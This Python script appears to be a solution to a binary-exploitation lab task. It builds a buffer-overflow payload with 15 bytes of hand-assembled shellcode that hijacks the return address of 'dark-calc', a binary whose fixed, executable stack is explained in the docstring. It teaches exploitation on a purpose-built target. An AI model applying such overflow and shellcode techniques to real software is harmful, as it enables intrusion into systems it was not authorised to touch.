#!/usr/bin/env python3
"""Task 2: execute shellcode that lives on the (fixed, executable) stack.

`dark-calc` is *not* a plain program: its entry point is `__wrap_main`

    401c0e <__wrap_main>:
      push %r12
      mov  %rsp,%r12
      mov  fixed_stack_top,%rsp   ; fixed_stack_top = 0x721000801000
      call main

and `init_fixed_stack` (called from the constructor path) does

    mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED...)
    mprotect(base,             0x1000, PROT_NONE)   ; guard page
    mprotect(base + 0x801000,  0x1000, PROT_NONE)   ; guard page
    fixed_stack_top = base + 0x801000

so for this binary the call stack lives at a *constant* address and is
*writable and executable* - ASLR and NX are both neutralised here.  That is
why a hard-coded stack address is legitimate for dark-calc (and only for it).

Consequences of the fixed layout:

    fixed_stack_top            = 0x721000801000
    main's rbp                 = 0x721000800FF0
    input's rbp                = 0x721000800FE0
    expression (rbp-0x10)      = 0x721000800FD0
    input's return address     = 0x721000800FE8
    first byte after `ret`     = 0x721000800FF0   <- our shellcode starts here

The guard page at 0x721000801000 means only 0x30 = 48 bytes can be written:
16 (buffer) + 8 (saved rbp) + 8 (return address) + 16 bytes of shellcode.
That is exactly the "very little room left for instructions" of the handout.

Shellcode (15 bytes):

    push $4             6a 04        ; grade_eval's argument
    pop  %rdi           5f
    push $0x401880      68 80 18 40 00   ; return address for grade_eval: exit@plt
    mov  $0x401a87,%eax b8 87 1a 40 00   ; grade_eval (fits in 32 bits)
    jmp  *%rax          ff e0

`push $0x401880` both provides grade_eval's return address and fixes the stack
alignment (grade_eval must be entered with rsp % 16 == 8, otherwise a glibc
printf that relies on `movaps` faults).  When grade_eval returns it jumps to
exit@plt, so the process terminates instead of falling back into the shellcode
(which would loop forever, since rsp is still the overflow's return-address
slot).
"""
import sys

STACK_BASE = 0x721000000000
STACK_TOP  = STACK_BASE + 0x801000         # = 0x721000801000
SHELLCODE  = STACK_TOP - 0x10              # = 0x721000800FF0, right after our ret addr

GRADE_EVAL = 0x401A87                      # prints "Hope A will be your grade!"
EXIT_PLT   = 0x401880

sc  = b"\x6a\x04"                          # push $4
sc += b"\x5f"                              # pop  %rdi
sc += b"\x68" + EXIT_PLT.to_bytes(4, "little")    # push $exit@plt
sc += b"\xb8" + GRADE_EVAL.to_bytes(4, "little")  # mov $grade_eval,%eax
sc += b"\xff\xe0"                          # jmp *%rax

payload  = b"A" * 16                       # expression[16]
payload += b"B" * 8                        # saved rbp
payload += SHELLCODE.to_bytes(8, "little") # return address -> shellcode on stack
payload += sc

assert len(payload) == 47 <= 48, len(payload)  # must stay below the guard page
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
